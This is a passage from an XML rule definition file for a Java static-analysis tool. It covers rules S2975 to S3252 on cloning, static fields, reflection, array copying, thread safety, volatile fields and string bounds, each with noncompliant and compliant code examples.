            &lt;li&gt; Fest: &lt;code&gt;assertThat&lt;/code&gt; is not followed by an assertion invocation &lt;/li&gt;
            &lt;li&gt; AssertJ: &lt;code&gt;assertThat&lt;/code&gt; is not followed by an assertion invocation &lt;/li&gt;
            &lt;li&gt; Mockito: &lt;code&gt;verify&lt;/code&gt; is not followed by a method invocation &lt;/li&gt;
            &lt;li&gt; Truth: &lt;code&gt;assertXXX&lt;/code&gt; is not followed by an assertion invocation &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;In such cases, what is intended to be a test doesn't actually verify anything&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            // Fest
            boolean result = performAction();
            // let's now check that result value is true
            assertThat(result); // Noncompliant; nothing is actually checked, the test passes whether &quot;result&quot;
            is true or false

            // Mockito
            List mockedList = Mockito.mock(List.class);
            mockedList.add(&quot;one&quot;);
            mockedList.clear();
            // let's check that &quot;add&quot; and &quot;clear&quot; methods are actually called
            Mockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            // Fest
            boolean result = performAction();
            // let's now check that result value is true
            assertThat(result).isTrue();

            // Mockito
            List mockedList = Mockito.mock(List.class);
            mockedList.add(&quot;one&quot;);
            mockedList.clear();
            // let's check that &quot;add&quot; and &quot;clear&quot; methods are actually called
            Mockito.verify(mockedList).add(&quot;one&quot;);
            Mockito.verify(mockedList).clear();
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Variable assignments and return statements are skipped to allow helper methods.&lt;/p&gt;
            &lt;pre&gt;
            private BooleanAssert check(String filename, String key) {
            String fileContent = readFileContent(filename);
            performReplacements(fileContent);
            return assertThat(fileContent.contains(key)); // No issue is raised here
            }

            @Test
            public void test() {
            check(&quot;foo.txt&quot;, &quot;key1&quot;).isTrue();
            check(&quot;bar.txt&quot;, &quot;key2&quot;).isTrue();
            }
            &lt;/pre&gt;
        </description>
        <tag>assertj</tag>
        <tag>mockito</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S2975' priority='BLOCKER'>
        <configKey>S2975</configKey>
        <name>&quot;clone&quot; should not be overridden</name>
        <description>
            &lt;p&gt;Many consider &lt;code&gt;clone&lt;/code&gt; and &lt;code&gt;Cloneable&lt;/code&gt; broken in Java,
            largely because the rules for overriding &lt;code&gt;clone&lt;/code&gt; are tricky
            and difficult to get right, according to Joshua Bloch:&lt;/p&gt;
            &lt;blockquote&gt;
            Object's clone method is very tricky. It's based on field copies, and it's &quot;extra-linguistic.&quot; It
            creates an object without calling a constructor.
            There are no guarantees that it preserves the invariants established by the constructors. There have been
            lots of bugs over the years, both in and
            outside Sun, stemming from the fact that if you just call super.clone repeatedly up the chain until you have
            cloned an object, you have a shallow
            copy of the object. The clone generally shares state with the object being cloned. If that state is mutable,
            you don't have two independent objects.
            If you modify one, the other changes as well. And all of a sudden, you get random behavior.
            &lt;/blockquote&gt;
            &lt;p&gt;A copy constructor or copy factory should be used instead.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;clone&lt;/code&gt; is overridden, whether or not &lt;code&gt;Cloneable&lt;/code&gt;
            is implemented.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            // ...

            public Object clone() { // Noncompliant
            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            // ...

            MyClass (MyClass source) {
            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.artima.com/intv/bloch13.html&quot;&gt;Copy Constructor versus
            Cloning&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h3&gt;See Also&lt;/h3&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS2157'&gt;S2157&lt;/a&gt; - &quot;Cloneables&quot;
            should implement &quot;clone&quot; &lt;/li&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS1182'&gt;S1182&lt;/a&gt; - Classes that override
            &quot;clone&quot; should be &quot;Cloneable&quot; and call &quot;super.clone()&quot; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S3008' priority='MINOR'>
        <configKey>S3008</configKey>
        <name>Static non-final field names should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared naming conventions allow teams to collaborate efficiently. This rule checks that static
            non-final field names match a provided regular
            expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default regular expression &lt;code&gt;^[a-z][a-zA-Z0-9]*$&lt;/code&gt;:&lt;/p&gt;
            &lt;pre&gt;
            public final class MyClass {
            private static String foo_bar;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyClass {
            private static String fooBar;
            }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <param>
            <key>format</key>
            <htmlDesc>Regular expression used to check the field names against.</htmlDesc>
            <defaultValue>^[a-z][a-zA-Z0-9]*$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S3010' priority='MAJOR'>
        <configKey>S3010</configKey>
        <name>Static fields should not be updated in constructors</name>
        <description>
            &lt;p&gt;Assigning a value to a &lt;code&gt;static&lt;/code&gt; field in a constructor could cause
            unreliable behavior at runtime since it will change the value for all
            instances of the class.&lt;/p&gt;
            &lt;p&gt;Instead remove the field's &lt;code&gt;static&lt;/code&gt; modifier, or initialize it statically.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Person {
            static Date dateOfBirth;
            static int expectedFingers;

            public Person(date birthday) {
            dateOfBirth = birthday; // Noncompliant; now everyone has this birthday
            expectedFingers = 10; // Noncompliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Person {
            Date dateOfBirth;
            static int expectedFingers = 10;

            public Person(date birthday) {
            dateOfBirth = birthday;
            }
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S3011' priority='MAJOR'>
        <configKey>S3011</configKey>
        <name>Reflection should not be used to increase accessibility of classes, methods, or fields</name>
        <description>
            &lt;p&gt;This rule raises an issue when reflection is used to change the visibility of a class, method or
            field, and when it is used to directly update a
            field value. Altering or bypassing the accessibility of classes, methods, or fields violates the
            encapsulation principle and could lead to run-time
            errors.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void makeItPublic(String methodName) throws NoSuchMethodException {

            this.getClass().getMethod(methodName).setAccessible(true); // Noncompliant
            }

            public void setItAnyway(String fieldName, int value) {
            this.getClass().getDeclaredField(fieldName).setInt(this, value); // Noncompliant; bypasses controls in
            setter
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/_jZGBQ&quot;&gt;CERT, SEC05-J.&lt;/a&gt; -
            Do not use reflection to increase accessibility of classes,
            methods, or fields &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S3012' priority='MINOR'>
        <configKey>S3012</configKey>
        <name>Arrays should not be copied using loops</name>
        <description>
            &lt;p&gt;Using a loop to copy an array or a subset of an array is simply wasted code when there are built-in
            functions to do it for you. Instead, use
            &lt;code&gt;Arrays.copyOf&lt;/code&gt; to copy an entire array into another array, use &lt;code&gt;System.arraycopy&lt;/code&gt;
            to copy only a subset of an array into
            another array, and use &lt;code&gt;Arrays.asList&lt;/code&gt; to feed the constructor of a new list with an
            array.&lt;/p&gt;
            &lt;p&gt;Note that &lt;code&gt;Arrays.asList&lt;/code&gt; simply puts a &lt;code&gt;Collections&lt;/code&gt;
            wrapper around the original array, so further steps are required if a
            non-fixed-size &lt;code&gt;List&lt;/code&gt; is desired.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void makeCopies(String[] source) {

            this.array = new String[source.length];
            this.list = new ArrayList(source.length);

            for (int i = 0; i &amp;lt; source.length; i++) {
            this.array[i] = source[i]; // Noncompliant
            }

            for (String s : source) {
            this.list.add(s); // Noncompliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void makeCopies(String[] source) {
            this.array = Arrays.copyOf(source, source.length);
            Collections.addAll(this.list, source);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Rule detects only the most idiomatic patterns, it will not consider loops with non-trivial control
            flow. For example, array elements that are
            copied conditionally are ignored.&lt;/p&gt;
            &lt;pre&gt;
            public int[] getCopy(int[] source) {
            int[] dest = new int[source.length];
            for (int i = 0; i &amp;lt; source.length; i++) {
            if (source[i] &amp;gt; 10) {
            dest[i] = source[i]; // Compliant
            }
            }
            return dest;
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S3014' priority='BLOCKER'>
        <configKey>S3014</configKey>
        <name>&quot;ThreadGroup&quot; should not be used</name>
        <description>
            &lt;p&gt;There is little valid reason to use the methods of the &lt;code&gt;ThreadGroup&lt;/code&gt; class.
            Some are deprecated (&lt;code&gt;allowThreadSuspension()&lt;/code&gt;,
            &lt;code&gt;resume()&lt;/code&gt;, &lt;code&gt;stop()&lt;/code&gt;, and &lt;code&gt;suspend()&lt;/code&gt;),
            some are obsolete, others aren't thread-safe, and still others are insecure
            (&lt;code&gt;activeCount()&lt;/code&gt;, &lt;code&gt;enumerate()&lt;/code&gt;) . For these reasons, any use
            of &lt;code&gt;ThreadGroup&lt;/code&gt; is suspicious and should be
            avoided.&lt;/p&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            ThreadFactory threadFactory = Executors.defaultThreadFactory();
            ThreadPoolExecutor executorPool = new ThreadPoolExecutor(3, 10, 5, TimeUnit.SECONDS, new ArrayBlockingQueue&amp;lt;Runnable&amp;gt;(2),
            threadFactory);

            for (int i = 0; i &amp;lt; 10; i++) {
            executorPool.execute(new JobThread(&quot;Job: &quot; + i));
            }

            System.out.println(executorPool.getActiveCount()); // Compliant
            executorPool.shutdown();
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/YzdGBQ&quot;&gt;CERT, THI01-J.&lt;/a&gt; -
            Do not invoke ThreadGroup methods &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>design</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S3020' priority='MINOR'>
        <configKey>S3020</configKey>
        <name>&quot;toArray&quot; should be passed an array of the proper type</name>
        <description>
            &lt;p&gt;Given no arguments, the &lt;code&gt;Collections.toArray&lt;/code&gt; method returns an &lt;code&gt;Object
            []&lt;/code&gt;, which will cause a
            &lt;code&gt;ClassCastException&lt;/code&gt; at runtime if you try to cast it to an array of the proper
            class. Instead, pass an array of the correct type in to the
            call.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public String [] getStringArray(List&amp;lt;String&amp;gt; strings) {
            return (String []) strings.toArray(); // Noncompliant; ClassCastException thrown
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public String [] getStringArray(List&amp;lt;String&amp;gt; strings) {
            return strings.toArray(new String[0]);
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S3034' priority='MAJOR'>
        <configKey>S3034</configKey>
        <name>Raw byte values should not be used in bitwise operations in combination with shifts</name>
        <description>
            &lt;p&gt;When reading bytes in order to build other primitive values such as &lt;code&gt;int&lt;/code&gt;s
            or &lt;code&gt;long&lt;/code&gt;s, the &lt;code&gt;byte&lt;/code&gt; values are
            automatically promoted, but that promotion can have unexpected results.&lt;/p&gt;
            &lt;p&gt;For instance, the binary representation of the integer 640 is &lt;code&gt;0b0000_0010_1000_0000&lt;/code&gt;,
            which can also be written with the array of
            (unsigned) bytes &lt;code&gt;[2, 128]&lt;/code&gt;. However, since Java uses two's complement, the
            representation of the integer in signed bytes will be &lt;code&gt;[2,
            -128]&lt;/code&gt; (because the &lt;code&gt;byte&lt;/code&gt; &lt;code&gt;0b1000_0000&lt;/code&gt; is
            promoted to the &lt;code&gt;int&lt;/code&gt;
            &lt;code&gt;0b1111_1111_1111_1111_1111_1111_1000_0000&lt;/code&gt;). Consequently, trying to reconstruct the
            initial integer by shifting and adding the values of
            the bytes without taking care of the sign will not produce the expected result. &lt;/p&gt;
            &lt;p&gt;To prevent such accidental value conversion, use bitwise and (&lt;code&gt;&amp;amp;&lt;/code&gt;)
            to combine the &lt;code&gt;byte&lt;/code&gt; value with &lt;code&gt;0xff&lt;/code&gt;
            (255) and turn all the higher bits back off.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue any time a &lt;code&gt;byte&lt;/code&gt; value is used as an operand
            without &lt;code&gt;&amp;amp; 0xff&lt;/code&gt;, when combined with shifts.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int intFromBuffer() {
            int result = 0;
            for (int i = 0; i &amp;lt; 4; i++) {
            result = (result &amp;lt;&amp;lt; 8) | readByte(); // Noncompliant
            }
            return result;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int intFromBuffer() {
            int result = 0;
            for (int i = 0; i &amp;lt; 4; i++) {
            result = (result &amp;lt;&amp;lt; 8) | (readByte() &amp;amp; 0xff);
            }
            return result;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/kDZGBQ&quot;&gt;CERT, NUM52-J.&lt;/a&gt; -
            Be aware of numeric promotion behavior &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S3038' priority='MINOR'>
        <configKey>S3038</configKey>
        <name>Abstract methods should not be redundant</name>
        <description>
            &lt;p&gt;There's no point in redundantly defining an &lt;code&gt;abstract&lt;/code&gt; method with the same
            signature as a method in an &lt;code&gt;interface&lt;/code&gt; that the
            class &lt;code&gt;implements&lt;/code&gt;. Any concrete child classes will have to implement the method
            either way.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public interface Reportable {
            String getReport();
            }

            public abstract class AbstractRuleReport implements Reportable{
            public abstract String getReport(); // Noncompliant

            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S3039' priority='MAJOR'>
        <configKey>S3039</configKey>
        <name>&quot;String&quot; calls should not go beyond their bounds</name>
        <description>
            &lt;p&gt;Just as you can't cut something into three halves, you can't grab a &lt;code&gt;substring&lt;/code&gt;
            that starts or ends outside the original
            &lt;code&gt;String&lt;/code&gt;'s bounds, you can't use &lt;code&gt;substring&lt;/code&gt; to get a reversed
            portion of a &lt;code&gt;String&lt;/code&gt;, and you can't get the
            &lt;code&gt;charAt&lt;/code&gt; a value that's before the &lt;code&gt;String&lt;/code&gt; starts or after it
            ends.&lt;/p&gt;
            &lt;p&gt;This rule detects when negative literal or &lt;code&gt;String::length&lt;/code&gt; is passed as an
            argument to the &lt;code&gt;String::substring&lt;/code&gt;,
            &lt;code&gt;String::charAt&lt;/code&gt; and related methods.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String speech = &quot;Now is the time for all good people to come to the aid of their country.&quot;;

            String substr1 = speech.substring(-1, speech.length()); // Noncompliant; start and end values both bad
            String substr2 = speech.substring(speech.length(), 0); // Noncompliant, start value must be &amp;lt; end
            value
            char ch = speech.charAt(speech.length()); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String speech = &quot;Now is the time for all good people to come to the aid of their country.&quot;;

            String substr1 = speech; // Closest correct values to original code yield whole string
            String substr2 = new StringBuilder(speech).reverse().toString()
            char ch = speech.charAt(speech.length()-1);
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S3042' priority='MAJOR'>
        <configKey>S3042</configKey>
        <name>&quot;writeObject&quot; should not be the only &quot;synchronized&quot; code in a class</name>
        <description>
            &lt;p&gt;The purpose of synchronization is to ensure that only one thread executes a given block of code at
            a time. There's no real problem with marking
            &lt;code&gt;writeObject&lt;/code&gt; &lt;code&gt;synchronized&lt;/code&gt;, but it's highly suspicious if
            this serialization-related method is the only
            &lt;code&gt;synchronized&lt;/code&gt; code in a &lt;code&gt;class&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class RubberBall {

            private Color color;
            private int diameter;

            public RubberBall(Color color, int diameter) {
            // ...
            }

            public void bounce(float angle, float velocity) {
            // ...
            }

            private synchronized void writeObject(ObjectOutputStream stream) throws IOException { // Noncompliant
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class RubberBall {

            private Color color;
            private int diameter;

            public RubberBall(Color color, int diameter) {
            // ...
            }

            public void bounce(float angle, float velocity) {
            // ...
            }

            private void writeObject(ObjectOutputStream stream) throws IOException {
            // ...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S3046' priority='BLOCKER'>
        <configKey>S3046</configKey>
        <name>&quot;wait&quot; should not be called when multiple locks are held</name>
        <description>
            &lt;p&gt;When two locks are held simultaneously, a &lt;code&gt;wait&lt;/code&gt; call only releases one of
            them. The other will be held until some other thread requests
            a lock on the awaited object. If no unrelated code tries to lock on that object, then all other threads will
            be locked out, resulting in a
            deadlock.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            synchronized (this.mon1) { // threadB can't enter this block to request this.mon2 lock &amp;amp; release
            threadA
            synchronized (this.mon2) {
            this.mon2.wait(); // Noncompliant; threadA is stuck here holding lock on this.mon1
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>deadlock</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S3064' priority='MAJOR'>
        <configKey>S3064</configKey>
        <name>Assignment of lazy-initialized members should be the last step with double-checked locking</name>
        <description>
            &lt;p&gt;Double-checked locking can be used for lazy initialization of &lt;code&gt;volatile&lt;/code&gt;
            fields, but only if field assignment is the last step in the
            &lt;code&gt;synchronized&lt;/code&gt; block. Otherwise you run the risk of threads accessing a
            half-initialized object.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            private volatile List&amp;lt;String&amp;gt; strings;

            public List&amp;lt;String&amp;gt; getStrings() {
            if (strings == null) { // check#1
            synchronized(MyClass.class) {
            if (strings == null) {
            strings = new ArrayList&amp;lt;&amp;gt;(); // Noncompliant
            strings.add(&quot;Hello&quot;); //When threadA gets here, threadB can skip the synchronized block because
            check#1 is false
            strings.add(&quot;World&quot;);
            }
            }
            }
            return strings;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {

            private volatile List&amp;lt;String&amp;gt; strings;

            public List&amp;lt;String&amp;gt; getStrings() {
            if (strings == null) { // check#1
            synchronized(MyClass.class) {
            if (strings == null) {
            List&amp;lt;String&amp;gt; tmpList = new ArrayList&amp;lt;&amp;gt;();
            tmpList.add(&quot;Hello&quot;);
            tmpList.add(&quot;World&quot;);
            strings = tmpList;
            }
            }
            }
            return strings;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/6zdGBQ&quot;&gt;CERT, LCK10-J.&lt;/a&gt; -
            Use a correct form of the double-checked locking idiom &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h3&gt;See Also&lt;/h3&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS2168'&gt;S2168&lt;/a&gt; - Double-checked locking
            should not be used &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S3065' priority='MAJOR'>
        <configKey>S3065</configKey>
        <name>Min and max used in combination should not always return the same value</name>
        <description>
            &lt;p&gt;When using &lt;code&gt;Math.min()&lt;/code&gt; and &lt;code&gt;Math.max()&lt;/code&gt; together for
            bounds checking, it's important to feed the right operands to each
            method. &lt;code&gt;Math.min()&lt;/code&gt; should be used with the &lt;strong&gt;upper&lt;/strong&gt; end
            of the range being checked, and &lt;code&gt;Math.max()&lt;/code&gt; should be
            used with the &lt;strong&gt;lower&lt;/strong&gt; end of the range. Get it backwards, and the result will
            always be the same end of the range.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private static final int UPPER = 20;
            private static final int LOWER = 0;

            public int doRangeCheck(int num) { // Let's say num = 12
            int result = Math.min(LOWER, num); // result = 0
            return Math.max(UPPER, result); // Noncompliant; result is now 20: even though 12 was in the range
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Swapping method &lt;code&gt;min()&lt;/code&gt; and &lt;code&gt;max()&lt;/code&gt; invocations
            without changing parameters.&lt;/p&gt;
            &lt;pre&gt;
            private static final int UPPER = 20;
            private static final int LOWER = 0;

            public int doRangeCheck(int num) { // Let's say num = 12
            int result = Math.max(LOWER, num); // result = 12
            return Math.min(UPPER, result); // Compliant; result is still 12
            }
            &lt;/pre&gt;
            &lt;p&gt;or swapping bounds &lt;code&gt;UPPER&lt;/code&gt; and &lt;code&gt;LOWER&lt;/code&gt; used as
            parameters without changing the invoked methods.&lt;/p&gt;
            &lt;pre&gt;
            private static final int UPPER = 20;
            private static final int LOWER = 0;

            public int doRangeCheck(int num) { // Let's say num = 12
            int result = Math.min(UPPER, num); // result = 12
            return Math.max(LOWER, result); // Compliant; result is still 12
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S3066' priority='MINOR'>
        <configKey>S3066</configKey>
        <name>&quot;enum&quot; fields should not be publicly mutable</name>
        <description>
            &lt;p&gt;&lt;code&gt;enum&lt;/code&gt;s are generally thought of as constant, but an &lt;code&gt;enum&lt;/code&gt;
            with a &lt;code&gt;public&lt;/code&gt; field or &lt;code&gt;public&lt;/code&gt; setter is
            non-constant. Ideally fields in an &lt;code&gt;enum&lt;/code&gt; are &lt;code&gt;private&lt;/code&gt; and
            set in the constructor, but if that's not possible, their visibility
            should be reduced as much as possible.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public enum Continent {

            NORTH_AMERICA (23, 24709000),
            // ...
            EUROPE (50, 39310000);

            public int countryCount; // Noncompliant
            private int landMass;

            Continent(int countryCount, int landMass) {
            // ...
            }

            public void setLandMass(int landMass) { // Noncompliant
            this.landMass = landMass;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public enum Continent {

            NORTH_AMERICA (23, 24709000),
            // ...
            EUROPE (50, 39310000);

            private int countryCount;
            private int landMass;

            Continent(int countryCount, int landMass) {
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>bad-practice</tag>
    </rule>

    <rule key='S3067' priority='MAJOR'>
        <configKey>S3067</configKey>
        <name>&quot;getClass&quot; should not be used for synchronization</name>
        <description>
            &lt;p&gt;&lt;code&gt;getClass&lt;/code&gt; should not be used for synchronization in non-&lt;code&gt;final&lt;/code&gt;
            classes because child classes will synchronize on a
            different object than the parent or each other, allowing multiple threads into the code block at once,
            despite the &lt;code&gt;synchronized&lt;/code&gt;
            keyword.&lt;/p&gt;
            &lt;p&gt;Instead, hard code the name of the class on which to synchronize or make the class &lt;code&gt;final&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            public void doSomethingSynchronized(){
            synchronized (this.getClass()) { // Noncompliant
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyClass {
            public void doSomethingSynchronized(){
            synchronized (MyClass.class) {
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/qTdGBQ&quot;&gt;CERT, LCK02-J.&lt;/a&gt; -
            Do not synchronize on the class object returned by getClass() &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S3077' priority='MINOR'>
        <configKey>S3077</configKey>
        <name>Non-primitive fields should not be &quot;volatile&quot;</name>
        <description>
            &lt;p&gt;Marking an array &lt;code&gt;volatile&lt;/code&gt; means that the array itself will always be read
            fresh and never thread cached, but the items &lt;em&gt;in&lt;/em&gt; the
            array will not be. Similarly, marking a mutable object field &lt;code&gt;volatile&lt;/code&gt; means the
            object &lt;em&gt;reference&lt;/em&gt; is &lt;code&gt;volatile&lt;/code&gt; but
            the object itself is not, and other threads may not see updates to the object state.&lt;/p&gt;
            &lt;p&gt;This can be salvaged with arrays by using the relevant AtomicArray class, such as &lt;code&gt;AtomicIntegerArray&lt;/code&gt;,
            instead. For mutable objects,
            the &lt;code&gt;volatile&lt;/code&gt; should be removed, and some other method should be used to ensure
            thread-safety, such as synchronization, or ThreadLocal
            storage.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private volatile int [] vInts; // Noncompliant
            private volatile MyObj myObj; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private AtomicIntegerArray vInts;
            private MyObj myObj;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/UzdGBQ&quot;&gt;CERT, CON50-J.&lt;/a&gt; -
            Do not assume that declaring a reference volatile guarantees safe
            publication of the members of the referenced object &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S3078' priority='MAJOR'>
        <configKey>S3078</configKey>
        <name>&quot;volatile&quot; variables should not be used with compound operators</name>
        <description>
            &lt;p&gt;Using compound operators as well as increments and decrements (and toggling, in the case of &lt;code&gt;boolean&lt;/code&gt;s)
            on primitive fields are not
            atomic operations. That is, they don't happen in a single step. For instance, when a &lt;code&gt;volatile&lt;/code&gt;
            primitive field is incremented or
            decremented you run the risk of data loss if threads interleave in the steps of the update. Instead, use a
            guaranteed-atomic class such as
            &lt;code&gt;AtomicInteger&lt;/code&gt;, or synchronize the access.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private volatile int count = 0;
            private volatile boolean boo = false;

            public void incrementCount() {
            count++; // Noncompliant
            }

            public void toggleBoo(){
            boo = !boo; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private AtomicInteger count = 0;
            private boolean boo = false;

            public void incrementCount() {
            count.incrementAndGet();
            }

            public synchronized void toggleBoo() {
            boo = !boo;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/SjdGBQ&quot;&gt;CERT, VNA02-J.&lt;/a&gt; -
            Ensure that compound operations on shared variables are atomic
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S3252' priority='CRITICAL'>
        <configKey>S3252</configKey>
        <name>&quot;static&quot; base class members should not be accessed via derived types</name>
        <description>
            &lt;p&gt;In the interest of code clarity, &lt;code&gt;static&lt;/code&gt; members of a &lt;code&gt;base&lt;/code&gt;
            class should never be accessed using a derived type's name.
            Doing so is confusing and could create the illusion that two different static members exist.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class Parent {
            public static int counter;
            }

            class Child extends Parent {
            public Child() {
            Child.counter++; // Noncompliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class Parent {
            public static int counter;
            }

            class Child extends Parent {
            public Child() {
            Parent.counter++;
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
